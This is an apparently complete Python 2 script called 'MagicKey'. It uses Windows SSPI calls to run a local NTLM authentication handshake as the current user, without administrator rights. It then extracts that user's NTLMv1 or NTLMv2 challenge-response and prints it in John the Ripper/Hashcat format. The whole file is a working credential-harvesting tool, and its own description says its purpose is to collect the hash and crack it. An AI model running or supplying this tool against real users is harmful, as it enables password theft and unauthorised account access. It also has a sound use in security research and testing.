import argparse
import win32security, sspicon
import hexdump
import win32api
import binascii
import re

error = win32security.error

MAX_BUFFER = 1024 ** 2 * 4

class _BaseAuth(object):
    def __init__(self):
        self.reset()

    def reset(self):
        """Reset everything to an unauthorized state"""
        self.ctxt = None
        self.authenticated = False
        # The next seq_num for an encrypt/sign operation
        self.next_seq_num = 0

class ClientAuth(_BaseAuth):
    """Manages the client side of an SSPI authentication handshake
    """

    def __init__(self,
                 pkg_name,  # Name of the package to used.
                 client_name=None,  # User for whom credentials are used.
                 auth_info=None,  # or a tuple of (username, domain, password)
                 targetspn=None,  # Target security context provider name.
                 scflags=None,  # security context flags
                 datarep=sspicon.SECURITY_NETWORK_DREP):

        if scflags is None:
            scflags = sspicon.ISC_REQ_INTEGRITY | sspicon.ISC_REQ_SEQUENCE_DETECT | sspicon.ISC_REQ_REPLAY_DETECT | sspicon.ISC_REQ_CONFIDENTIALITY  #|sspicon.SEC_WINNT_AUTH_IDENTITY_ANSI

        self.scflags = scflags
        self.datarep = datarep
        self.targetspn = targetspn

        username = win32api.GetUserName()
        domain = win32api.GetDomainName()
        password = None

        auth_info = username, domain, password

        self.pkg_info = win32security.QuerySecurityPackageInfo(pkg_name)
        self.credentials, \
        self.credentials_expiry = win32security.AcquireCredentialsHandle(
            client_name, self.pkg_info['Name'],
            sspicon.SECPKG_CRED_OUTBOUND,
            None, auth_info)
        _BaseAuth.__init__(self)

    # Perform *one* step of the client authentication process.
    def authorize(self, sec_buffer_in):
        if sec_buffer_in is not None and type(sec_buffer_in) != win32security.PySecBufferDescType:
            # User passed us the raw data - wrap it into a SecBufferDesc
            sec_buffer_new = win32security.PySecBufferDescType()
            tokenbuf = win32security.PySecBufferType(self.pkg_info['MaxToken'],
                                                     sspicon.SECBUFFER_TOKEN)
            tokenbuf.Buffer = sec_buffer_in
            sec_buffer_new.append(tokenbuf)
            sec_buffer_in = sec_buffer_new
        sec_buffer_out = win32security.PySecBufferDescType()
        tokenbuf = win32security.PySecBufferType(self.pkg_info['MaxToken'], sspicon.SECBUFFER_TOKEN)
        sec_buffer_out.append(tokenbuf)
        ## input context handle should be NULL on first call
        ctxtin = self.ctxt
        if self.ctxt is None:
            self.ctxt = win32security.PyCtxtHandleType()
        err, attr, exp = win32security.InitializeSecurityContext(
            self.credentials,
            ctxtin,
            self.targetspn,
            self.scflags,
            self.datarep,
            sec_buffer_in,
            self.ctxt,
            sec_buffer_out)

        # Stash these away incase someone needs to know the state from the
        # final call.
        self.ctxt_attr = attr
        self.ctxt_expiry = exp

        if err in (sspicon.SEC_I_COMPLETE_NEEDED, sspicon.SEC_I_COMPLETE_AND_CONTINUE):
            self.ctxt.CompleteAuthToken(sec_buffer_out)
        self.authenticated = err == 0
        return err, sec_buffer_out

class ServerAuth(_BaseAuth):
    """Manages the server side of an SSPI authentication handshake
    """

    def __init__(self,
                 pkg_name,
                 spn=None,
                 scflags=None,
                 datarep=sspicon.SECURITY_NETWORK_DREP):
        self.spn = spn
        self.datarep = datarep

        if scflags is None:
            scflags = sspicon.ASC_REQ_INTEGRITY | sspicon.ASC_REQ_SEQUENCE_DETECT | \
                      sspicon.ASC_REQ_REPLAY_DETECT | sspicon.ASC_REQ_CONFIDENTIALITY
        # Should we default to sspicon.KerbAddExtraCredentialsMessage
        # if pkg_name=='Kerberos'?
        self.scflags = scflags

        self.pkg_info = win32security.QuerySecurityPackageInfo(pkg_name)

        self.credentials, \
        self.credentials_expiry = win32security.AcquireCredentialsHandle(spn,
                                                                         self.pkg_info['Name'],
                                                                         sspicon.SECPKG_CRED_INBOUND, None, None)
        _BaseAuth.__init__(self)

    # Perform *one* step of the server authentication process.
    def authorize(self, sec_buffer_in):
        if sec_buffer_in is not None and type(sec_buffer_in) != win32security.PySecBufferDescType:
            # User passed us the raw data - wrap it into a SecBufferDesc
            sec_buffer_new = win32security.PySecBufferDescType()
            tokenbuf = win32security.PySecBufferType(self.pkg_info['MaxToken'],
                                                     sspicon.SECBUFFER_TOKEN)
            tokenbuf.Buffer = sec_buffer_in
            sec_buffer_new.append(tokenbuf)
            sec_buffer_in = sec_buffer_new

        sec_buffer_out = win32security.PySecBufferDescType()
        tokenbuf = win32security.PySecBufferType(self.pkg_info['MaxToken'], sspicon.SECBUFFER_TOKEN)
        sec_buffer_out.append(tokenbuf)

        ## input context handle is None initially, then handle returned from last call thereafter
        ctxtin = self.ctxt
        if self.ctxt is None:
            self.ctxt = win32security.PyCtxtHandleType()
        err, attr, exp = win32security.AcceptSecurityContext(self.credentials, ctxtin,
                                                             sec_buffer_in, self.scflags,
                                                             self.datarep, self.ctxt, sec_buffer_out)

        # Stash these away incase someone needs to know the state from the
        # final call.
        self.ctxt_attr = attr
        self.ctxt_expiry = exp

        if err in (sspicon.SEC_I_COMPLETE_NEEDED, sspicon.SEC_I_COMPLETE_AND_CONTINUE):
            self.ctxt.CompleteAuthToken(sec_buffer_out)
        self.authenticated = err == 0
        return err, sec_buffer_out


if __name__ == '__main__':
    banner='''
              __  __             _      _  __
             |  \/  | __ _  __ _(_) ___| |/ /___ _   _
             | |\/| |/ _` |/ _` | |/ __| ' // _ \ | | |
             | |  | | (_| | (_| | | (__| . \  __/ |_| |
             |_|  |_|\__,_|\__, |_|\___|_|\_\___|\__, |
                           |___/                 |___/

                           George Fekkas
            <g [dot] fekkas [at] encodegroup [dot] com>
    '''

    print banner
    parser = argparse.ArgumentParser(description='The MagicKey is an application for harvesting NTLMv1/NTLMv2 hash (currently Logged On User) without having administrator privileges. Then you can crack the hash. Magic, huh!!!')

    parser.add_argument('-v','--verbose',action='store_true', help='show loop dance authentication (Type1/Type2/Type3)')

    args=parser.parse_args()

    # Setup the 2 contexts.
    sspiclient = ClientAuth("NTLM")
    sspiserver = ServerAuth("NTLM")

    sec_buffer = None
    LmHashBuffer = None
    Hash = []
    Nonce = []
    NTLMv2ClentChallenge = []
    flag=False
    start=0
    end=0
    nthash=0
    ntlm2hash=[]
    ClientChallenge=[]

    while 1:
        # Perform the authentication dance, each loop exchanging more information
        # on the way to completing authentication.
        err, sec_buffer = sspiclient.authorize(sec_buffer)

        if args.verbose:
            print hexdump.hexdump(sec_buffer[0].Buffer)

        LmHashBuffer = sec_buffer[0].Buffer
        clean1 = binascii.hexlify(LmHashBuffer)[:-32]

        for a in list(re.finditer('0101000000000000', clean1)):
            start=a.start()
            nthash=start-32
            end=a.end()

        for i in range(nthash,start):
            ntlm2hash.append(clean1[i])

        ClientChallenge.append(clean1.split('0101000000000000'))

        if bool(re.search("0101000000000000",clean1)):
            flag=True
        else:
            clean1=clean1[-96:]
            splits=map(''.join, zip(*[iter(clean1)] * 48))
            Hash.append(splits)

        err, sec_buffer = sspiserver.authorize(sec_buffer)
        if args.verbose:
            print hexdump.hexdump(sec_buffer[0].Buffer)

        a = buffer(sec_buffer[0].Buffer, 24, 8)
        dataNonce = binascii.hexlify(a)
        Nonce.append(dataNonce)

        if err == 0:
            break

    if flag==True:
        print "\n[*]-Magic string 0101000000000000 found. SSPI-->NTLMv2 detected."
        print "[*]-User:", win32api.GetUserName()
        print "[*]-Domain:", win32api.GetDomainName()
        print "[*]-Server Challenge:",  Nonce[0]
        print "[*]-NTHash:", ''.join(ntlm2hash)
        print "[*]-Client Challenge:", ":0101000000000000" + ClientChallenge[1][1]
        print "\n[*]-NTLMv2 Hash Format--><UserName::DomainName:ServerChallenge(8-byte):NThash(16-byte):ClientChallenge>"
        print "[*]-John The Ripper||Hashcat Format:"
        print "\n", win32api.GetUserName() + "::" + win32api.GetDomainName() + ":" + Nonce[0] + ":"+''.join(ntlm2hash)+":0101000000000000" + ClientChallenge[1][1]
    else:
        print "\n[*]-SSPI-->NTLMv1 detected."
        print "[*]-User:", win32api.GetUserName()
        print "[*]-Domain:", win32api.GetDomainName()
        print "[*]-NTLMv1 Hash:", ':'.join(Hash[1])
        print "[*]-Server Challenge:",  Nonce[0]
        print "\n[*]-NTLMv1 Hash Format--><UserName::DomainName:LMhash(24-byte):NThash(24-byte):ServerChallenge(8-byte)>"
        print "[*]-John The Ripper||Hashcat Format:"
        print "\n", win32api.GetUserName() + "::" + win32api.GetDomainName() + ":" + ':'.join(Hash[1]) + ":" + Nonce[0]

